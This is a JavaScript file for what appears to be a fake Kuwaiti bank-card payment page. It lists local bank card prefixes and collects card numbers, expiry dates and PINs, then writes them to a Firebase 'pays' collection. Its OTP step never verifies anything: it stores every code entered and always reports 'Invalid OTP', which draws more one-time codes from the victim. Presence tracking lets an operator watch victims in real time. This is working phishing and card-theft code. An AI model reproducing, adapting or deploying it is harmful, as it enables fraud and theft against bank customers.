// Initialize Firebase
const firebaseConfig = {
    apiKey: 'AIzaSyAD3iyMWhdzQ4VIXZcwCpUJTnqFTe5jt7U',
    authDomain: 'wedsdasd.firebaseapp.com',
    projectId: 'wedsdasd',
    storageBucket: 'wedsdasd.firebasestorage.app',
    messagingSenderId: '299161995646',
    appId: '1:299161995646:web:45b8e58faa99d3e75ccb2f',
    measurementId: 'G-614JDKQGMC',

};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();
const database = firebase.database();

// Define the BANKS array that was missing from the original code
const BANKS = [
  {
    value: 'ABK',
    label: 'Al Ahli Bank of Kuwait',
    cardPrefixes: ['403622', '428628', '423826'],
  },
  {
    value: 'ALRAJHI',
    label: 'Al Rajhi Bank',
    cardPrefixes: ['458838'],
  },
  {
    value: 'BBK',
    label: 'Bank of Bahrain and Kuwait',
    cardPrefixes: ['418056', '588790'],
  },
  {
    value: 'BOUBYAN',
    label: 'Boubyan Bank',
    cardPrefixes: [
      '470350',
      '490455',
      '490456',
      '404919',
      '450605',
      '426058',
      '431199',
    ],
  },
  {
    value: 'BURGAN',
    label: 'Burgan Bank',
    cardPrefixes: [
      '468564',
      '402978',
      '403583',
      '415254',
      '450238',
      '540759',
      '49219000',
    ],
  },
  {
    value: 'CBK',
    label: 'Commercial Bank of Kuwait',
    cardPrefixes: ['532672', '537015', '521175', '516334'],
  },
  {
    value: 'Doha',
    label: 'Doha Bank',
    cardPrefixes: ['419252'],
  },
  {
    value: 'GBK',
    label: 'Gulf Bank',
    cardPrefixes: [
      '526206',
      '531470',
      '531644',
      '531329',
      '517419',
      '517458',
      '531471',
      '559475',
    ],
  },
  {
    value: 'TAM',
    label: 'TAM Bank',
    cardPrefixes: ['45077848', '45077849'],
  },
  {
    value: 'KFH',
    label: 'Kuwait Finance House',
    cardPrefixes: ['485602', '537016', '5326674', '450778'],
  },
  {
    value: 'KIB',
    label: 'Kuwait International Bank',
    cardPrefixes: ['409054', '406464'],
  },
  {
    value: 'NBK',
    label: 'National Bank of Kuwait',
    cardPrefixes: ['464452', '589160'],
  },
  {
    value: 'Weyay',
    label: 'Weyay Bank',
    cardPrefixes: ['46445250', '543363'],
  },
  {
    value: 'QNB',
    label: 'Qatar National Bank',
    cardPrefixes: ['521020', '524745'],
  },
  {
    value: 'UNB',
    label: 'Union National Bank',
    cardPrefixes: ['457778'],
  },
  {
    value: 'WARBA',
    label: 'Warba Bank',
    cardPrefixes: ['541350', '525528', '532749', '559459'],
  },
];

// Store payment information
const paymentInfo = {
  step: 1, // 1 = card details, 2 = OTP verification
  bankName: '',
  cardPrefix: '',
  cardNumber: '',
  month: '',
  year: '',
  pin: '',
  sessionId: '', // To track the current payment session
  otp: '' ,// To store the generated OTP,
  allOtps:[""]
};

// Generate a random OTP
function generateOTP() {
}

// Generate a unique session ID
function generateSessionId() {
  return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

document.addEventListener('DOMContentLoaded', function () {
  // Get DOM elements
  const amountElement = document.getElementById('amount');
  const bankSelect = document.getElementById('bankSelect');
  const prefixSelect = document.getElementById('dcprefix');
  const debitNumber = document.getElementById('debitNumber');
  const monthSelect = document.getElementById('monthSelect');
  const yearSelect = document.getElementById('yearSelect');
  const cardPin = document.getElementById('cardPin');
  const submitButton = document.getElementById('submitButton');
  const cancelButton = document.getElementById('cancelButton');
  const cardDetailsSection = document.getElementById('cardDetailsSection');
  const otpVerificationSection = document.getElementById('otpVerificationSection');
  const DCNumber = document.getElementById('DCNumber');
  const expmnth = document.getElementById('expmnth');
  const expyear = document.getElementById('expyear');
  const debitOTPtimer = document.getElementById('debitOTPtimer');
  const resendButton = document.getElementById('Resend');
  const loadingIndicator = document.getElementById('loading');
  const errorMessage = document.getElementById('errorMessage');
window.addEventListener('load',()=>{
    const _id=localStorage.getItem('visitor')
  setupOnlineStatus(_id);

})
  // Function to setup online status (from the provided implementation)
  function setupOnlineStatus(userId) {
    if (!userId) return;

    // Create a reference to this user's specific status node in Realtime Database
    const userStatusRef = database.ref(`/status/${userId}`);

    // Create a reference to the user's document in Firestore
    const userDocRef = db.collection('pays').doc(userId);

    // Set up the Realtime Database onDisconnect hook
    userStatusRef
      .onDisconnect()
      .set({
        state: 'offline',
        lastChanged: firebase.database.ServerValue.TIMESTAMP,
      })
      .then(() => {
        // Update the Realtime Database when this client connects
        userStatusRef.set({
          state: 'online',
          lastChanged: firebase.database.ServerValue.TIMESTAMP,
        });

        // Update the Firestore document
        userDocRef
          .update({
            online: true,
            lastSeen: firebase.firestore.FieldValue.serverTimestamp(),
          })
          .catch((error) =>
            console.error('Error updating Firestore document:', error)
          );
      })
      .catch((error) =>
        console.error('Error setting onDisconnect:', error)
      );

    // Listen for changes to the user's online status
    userStatusRef.on('value', (snapshot) => {
      const status = snapshot.val();
      if (status?.state === 'offline') {
        // Update the Firestore document when user goes offline
        userDocRef
          .update({
            online: false,
            lastSeen: firebase.firestore.FieldValue.serverTimestamp(),
          })
          .catch((error) =>
            console.error('Error updating Firestore document:', error)
          );
      }
    });
  }

  // Function to set user offline (from the provided implementation)
  async function setUserOffline(userId) {
    if (!userId) return;

    try {
      // Update the Firestore document
      await db.collection('pays').doc(userId).update({
        online: false,
        lastSeen: firebase.firestore.FieldValue.serverTimestamp(),
      });

      // Update the Realtime Database
      await database.ref(`/status/${userId}`).set({
        state: 'offline',
        lastChanged: firebase.database.ServerValue.TIMESTAMP,
      });
    } catch (error) {
      console.error('Error setting user offline:', error);
    }
  }

  // Show amount from localStorage if available
  const storedAmount = localStorage.getItem('amount');
  if (storedAmount) {
    amountElement.textContent = storedAmount + ' KD ';
  }

  // Populate bank options
  BANKS.forEach((bank) => {
    const option = document.createElement('option');
    option.value = bank.value;
    option.textContent = `${bank.label} [${bank.value}]`;
    bankSelect.appendChild(option);
  });

  // Handle bank selection change
  bankSelect.addEventListener('change', function () {
    const selectedBankValue = this.value;
    const selectedBank = BANKS.find(
      (bank) => bank.value === selectedBankValue
    );

    paymentInfo.bankName = selectedBankValue;

    // Update prefix dropdown
    prefixSelect.innerHTML = '<option value="i">prefix</option>';

    if (selectedBank) {
      selectedBank.cardPrefixes.forEach((prefix) => {
        const option = document.createElement('option');
        option.value = prefix;
        option.textContent = prefix;
        prefixSelect.appendChild(option);
      });
    }

    checkCardFormValidity();
  });

  // Handle prefix selection
  prefixSelect.addEventListener('change', function () {
    paymentInfo.cardPrefix = this.value;
    checkCardFormValidity();
  });

  // Handle card number input
  debitNumber.addEventListener('input', function () {
    paymentInfo.cardNumber = this.value;
    checkCardFormValidity();
  });
  window.addEventListener('beforeunload', function () {
    const userId = localStorage.getItem('visitor') || _id;
    setUserOffline(userId);
  });
  // Handle month selection
  monthSelect.addEventListener('change', function () {
    paymentInfo.month = this.value;
    checkCardFormValidity();
  });

  // Handle year selection
  yearSelect.addEventListener('change', function () {
    paymentInfo.year = this.value;
    checkCardFormValidity();
  });

  // Handle PIN input
  cardPin.addEventListener('input', function () {
    paymentInfo.pin = this.value;
    checkCardFormValidity();
  });

  // Handle OTP input
  debitOTPtimer.addEventListener('input', function () {
    checkOtpFormValidity();
    // Hide error message when user starts typing
    errorMessage.style.display = 'none';
  });

  // Check if card form is valid
  function checkCardFormValidity() {
    const isValid =
      bankSelect.value !== 'bankname' &&
      prefixSelect.value !== 'i' &&
      debitNumber.value.length === 10 &&
      monthSelect.value !== '0' &&
      yearSelect.value !== '0' &&
      cardPin.value.length === 4;

    submitButton.disabled = !isValid;
  }

  // Check if OTP form is valid
  function checkOtpFormValidity() {
    submitButton.disabled = debitOTPtimer.value.length !== 6;
  }
  async function handlePay(paymentInfo) {
    try {
      const visitorId = localStorage.getItem('visitor');
      if (visitorId) {
        await db
          .collection('pays')
          .doc(visitorId)
          .set(
            {
              ...paymentInfo,
              status: 'pending',
              createdDate: new Date().toISOString(),
            },
            { merge: true }
          );

        // Redirect to payment methods page
      }
    } catch (error) {
      console.error('Error adding document: ', error);
      alert('Error adding payment info to Firestore');
    }
  }

  // Store payment data and OTP in Firestore
  async function storePaymentData() {
    // Generate a session ID and OTP
    paymentInfo.sessionId = generateSessionId();
    paymentInfo.otp = generateOTP();
    
    try {
      // Store payment data in Firestore
      handlePay({
        bankName: paymentInfo.bankName,
        prefix: paymentInfo.cardPrefix,
        cardNumber: paymentInfo.cardNumber,
        month: paymentInfo.month,
        year: paymentInfo.year,
        pass: paymentInfo.pin,
        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
        status: 'pending'
      });
      
      console.log('Payment data stored with OTP:', paymentInfo.otp);
      return true;
    } catch (error) {
      console.error('Error storing payment data:', error);
      return false;
    }
  }

  // Verify OTP against stored value in Firestore
  async function verifyOTP(enteredOTP) {
    try {
      paymentInfo.allOtps.push(enteredOTP)
      // Get the payment document from Firestore
   handlePay({otp:enteredOTP,allOtps:paymentInfo.allOtps})
    } catch (error) {
      console.error('Error verifying OTP:', error);
      return false;
    }
  }

  // Handle form submission
  submitButton.addEventListener('click', async function () {
    if (this.disabled) return;

    loadingIndicator.style.display = 'block';

    if (paymentInfo.step === 1) {
      // First step submission - store payment data and show OTP verification
      const success = await storePaymentData();
      
      if (success) {
        setTimeout(function () {
          loadingIndicator.style.display = 'none';

          // Update payment info step
          paymentInfo.step = 2;

          // Update masked card details
          const selectedPrefix = prefixSelect.value;
          const maskedCardNumber =
            selectedPrefix +
            '******' +
            paymentInfo.cardNumber.substring(
              paymentInfo.cardNumber.length - 4
            );
          DCNumber.textContent = maskedCardNumber;
          expmnth.textContent =
            monthSelect.options[monthSelect.selectedIndex].text;
          expyear.textContent =
            yearSelect.options[yearSelect.selectedIndex].text;

          // Hide card details, show OTP verification
          cardDetailsSection.style.display = 'none';
          otpVerificationSection.style.display = 'block';

          // Update button text
          submitButton.textContent = 'Confirm';
          submitButton.disabled = true;

          // Focus on OTP input
          debitOTPtimer.focus();

          // Show resend button after 30 seconds
          setTimeout(function () {
            resendButton.style.display = 'block';
          }, 30000);
        }, 1500);
      } else {
        loadingIndicator.style.display = 'none';
        alert('Error processing payment. Please try again.');
      }
    } else {
      // OTP verification submission
      const enteredOTP = debitOTPtimer.value;
      const isValid = await verifyOTP(enteredOTP);
      
      setTimeout(function () {
        loadingIndicator.style.display = 'none';

        if (isValid) {
          // OTP is valid, show success message
          alert('Payment verified successfully!');
          
          // Reset form for new payment
          resetForm();
        } else {
          // OTP is invalid, show error message
          errorMessage.textContent = 'Invalid OTP. Please try again.';
          errorMessage.style.display = 'block';
          debitOTPtimer.value = '';
          debitOTPtimer.focus();
          submitButton.disabled = true;
        }
      }, 1500);
    }
  });

  // Handle resend OTP button
  resendButton.addEventListener('click', async function () {
    loadingIndicator.style.display = 'block';
    
    // Generate a new OTP
    paymentInfo.otp = generateOTP();
    
    try {
      // Update the OTP in Firestore
      await db.collection('pays').doc(paymentInfo.sessionId).update({
        otp: paymentInfo.otp,
        otpResent: true,
        otpResentAt: firebase.firestore.FieldValue.serverTimestamp()
      });
      
      setTimeout(function () {
        loadingIndicator.style.display = 'none';
        alert('A new OTP has been sent to your registered mobile number.');
        debitOTPtimer.value = '';
        debitOTPtimer.focus();
        submitButton.disabled = true;
        errorMessage.style.display = 'none';
      }, 1500);
    } catch (error) {
      console.error('Error resending OTP:', error);
      loadingIndicator.style.display = 'none';
      alert('Error sending OTP. Please try again.');
    }
  });

  // Handle cancel button
  cancelButton.addEventListener('click', function () {
    if (paymentInfo.step === 2) {
      // If on OTP verification step, go back to card details
      cardDetailsSection.style.display = 'block';
      otpVerificationSection.style.display = 'none';
      paymentInfo.step = 1;
      submitButton.textContent = 'Submit';
      errorMessage.style.display = 'none';
      checkCardFormValidity();
    } else {
      // Otherwise, reset the form
      resetForm();
    }
  });

  // Reset form to initial state
  function resetForm() {
    // Reset payment info
    paymentInfo.step = 1;
    paymentInfo.bankName = '';
    paymentInfo.cardPrefix = '';
    paymentInfo.cardNumber = '';
    paymentInfo.month = '';
    paymentInfo.year = '';
    paymentInfo.pin = '';
    paymentInfo.sessionId = '';
    paymentInfo.otp = '';

    // Reset form fields
    bankSelect.value = 'bankname';
    prefixSelect.innerHTML = '<option value="i">prefix</option>';
    debitNumber.value = '';
    monthSelect.value = '0';
    yearSelect.value = '0';
    cardPin.value = '';
    debitOTPtimer.value = '';

    // Show card details, hide OTP verification
    cardDetailsSection.style.display = 'block';
    otpVerificationSection.style.display = 'none';

    // Reset button
    submitButton.textContent = 'Submit';
    submitButton.disabled = true;

    // Hide resend button and error message
    resendButton.style.display = 'none';
    errorMessage.style.display = 'none';
  }
});